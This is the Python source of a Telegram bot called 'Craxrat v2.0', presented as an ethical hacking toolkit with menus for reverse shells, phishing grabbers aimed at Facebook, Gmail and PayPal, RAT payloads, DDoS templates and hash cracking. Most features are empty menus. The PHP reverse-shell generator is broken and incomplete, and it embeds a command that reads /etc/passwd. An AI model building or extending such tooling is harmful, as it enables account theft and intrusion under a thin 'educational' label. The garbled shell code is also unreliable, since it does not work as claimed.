import telebot
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from bs4 import BeautifulSoup
import socket
import json
import nmap
import whois
from PIL import Image
import io
import qrcode
from cryptography.fernet import Fernet
import base64

TOKEN = os.getenv('TELEGRAM_TOKEN')
bot = telebot.TeleBot(TOKEN)

user_data = {}

# Craxrat Main Menu
def craxrat_menu():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("🔍 Target Analyzer", callback_data="analyzer"))
    markup.add(InlineKeyboardButton("🐚 Shell Generator", callback_data="shells"))
    markup.add(InlineKeyboardButton("🎣 Phishing Grabber", callback_data="grabber"))
    markup.add(InlineKeyboardButton("🤖 RAT Payloads", callback_data="rat"))
    markup.add(InlineKeyboardButton("☁️ DDoS Tools", callback_data="ddos"))
    markup.add(InlineKeyboardButton("🔓 Cracker", callback_data="cracker"))
    markup.add(InlineKeyboardButton("📊 Stats", callback_data="stats"))
    return markup

@bot.message_handler(commands=['start', 'craxrat'])
def start(message):
    bot.send_photo(message.chat.id, "https://i.imgur.com/craxrat_banner.jpg", 
                   caption="🔥 **Craxrat v2.0 - Ethical Hacking Bot**\n\nEducational pentesting tools only!\n\nChoose your tool:", 
                   reply_markup=craxrat_menu(), parse_mode='Markdown')

# Target Analyzer
@bot.callback_query_handler(func=lambda call: call.data == "analyzer")
def analyzer_menu(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("🌐 IP/URL Info", callback_data="ipinfo"))
    markup.add(InlineKeyboardButton("🔌 Port Scan", callback_data="portscan"))
    markup.add(InlineKeyboardButton("🛠️ Tech Stack", callback_data="techstack"))
    markup.add(InlineKeyboardButton("📍 GeoLocation", callback_data="geoloc"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
    bot.edit_message_text("🔍 **Target Analyzer**\nSelect analysis type:", 
                         call.message.chat.id, call.message.message_id, 
                         reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['ip'])
def ip_info(message):
    target = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else None
    if target:
        try:
            # IP Info
            ip_info = socket.gethostbyname(target) if not target.replace('.','').isdigit() else target
            bot.reply_to(message, f"```\nIP: {ip_info}\nHostname: {socket.gethostbyaddr(ip_info)[0] if socket.gethostbyaddr(ip_info) else 'N/A'}\n```", parse_mode='Markdown')
        except:
            bot.reply_to(message, "❌ Invalid target!")

# Shell Generator
@bot.callback_query_handler(func=lambda call: call.data == "shells")
def shells_menu(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("🐍 PHP Reverse", callback_data="php_rev"))
    markup.add(InlineKeyboardButton("🐚 Bash Reverse", callback_data="bash_rev"))
    markup.add(InlineKeyboardButton("⚡ Python Rev", callback_data="py_rev"))
    markup.add(InlineKeyboardButton("🔗 Netcat", callback_data="nc_shell"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
    bot.edit_message_text("🐚 **Shell Generators**\nSelect shell type:", 
                         call.message.chat.id, call.message.message_id, 
                         reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['php'])
def php_shell(message):
    lhost = message.text.split()[1] if len(message.text.split()) > 2 else "YOUR_IP"
    lport = message.text.split()[2] if len(message.text.split()) > 2 else "4444"
    
    php_rev = f'''<?php 
set_time_limit (0); 
$VERSION = "1.0"; 
$ip = '{lhost}'; 
$port = {lport}; 
$chunk_size = 1400; 
$write_a = null; 
$error_a = null; 
$shell = 'uname -a && cat /etc/passwd && id'; 
$daemon = 0; 
$debug = 0; 
if (function_exists('error_log')) {{ 
    $write_a = error_log; 
}} else if (function_exists('syslog')) {{ 
    $write_a = 'syslog'; 
}} 
while ((!@ob_end_clean()) && strlen(ltrim(@ob_get_contents())) < 4096) {{ 
    $write_a = 'ob_end_flush'; 
}}'''

    bot.reply_to(message, f"```php\n{php_rev}\n```\n💾 Save as shell.php", parse_mode='Markdown')

# Phishing Grabber
@bot.callback_query_handler(func=lambda call: call.data == "grabber")
def grabber_menu(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("📘 Facebook", callback_data="fb_grab"))
    markup.add(InlineKeyboardButton("📧 Gmail", callback_data="gmail_grab"))
    markup.add(InlineKeyboardButton("💳 Paypal", callback_data="paypal_grab"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
    bot.edit_message_text("🎣 **Phishing Grabbers**\nSelect target:", 
                         call.message.chat.id, call.message.message_id, 
                         reply_markup=markup, parse_mode='Markdown')

# RAT Payloads (Educational)
@bot.callback_query_handler(func=lambda call: call.data == "rat")
def rat_menu(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("📱 Android RAT", callback_data="android_rat"))
    markup.add(InlineKeyboardButton("💻 Windows RAT", callback_data="win_rat"))
    markup.add(InlineKeyboardButton("🐧 Linux RAT", callback_data="linux_rat"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
    bot.edit_message_text("🤖 **RAT Payloads**\nEducational payloads only:", 
                         call.message.chat.id, call.message.message_id, 
                         reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['rat'])
def rat_generator(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Android", callback_data="android_payload"))
    markup.add(InlineKeyboardButton("Windows", callback_data="windows_payload"))
    markup.add(InlineKeyboardButton("Linux", callback_data="linux_payload"))
    bot.reply_to(message, "🤖 **Select RAT Type:**", reply_markup=markup)

# DDoS Simulation
@bot.callback_query_handler(func=lambda call: call.data == "ddos")
def ddos_menu(call):
    bot.edit_message_text("☁️ **DDoS Templates** (Educational Simulation Only)\n\n```\nEducational stress test templates:\n• SYN Flood (Python)\n• HTTP Flood (Go)\n• Slowloris Attack\n• UDP Amplification\n```\n⚠️ Testing authorized targets only!", 
                         call.message.chat.id, call.message.message_id, parse_mode='Markdown')

# Hash Cracker
@bot.message_handler(commands=['crack'])
def crack_hash(message):
    hash_val = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else None
    if hash_val:
        # Simple hash identifier
        if len(hash_val) == 32:
            bot.reply_to(message, f"🔓 **MD5 Hash Detected**\n\n```\n{hash_val}\n```\nEducational cracking demo:\nhashcat -m 0 -a 0 {hash_val} rockyou.txt", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Unknown hash format!")

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "main":
        bot.edit_message_text("🔥 **Craxrat v2.0**\nChoose tool:", 
                            call.message.chat.id, call.message.message_id, 
                            reply_markup=craxrat_menu(), parse_mode='Markdown')

# Run bot
if __name__ == '__main__':
    print("🚀 Craxrat Bot Started!")
    bot.infinity_polling()
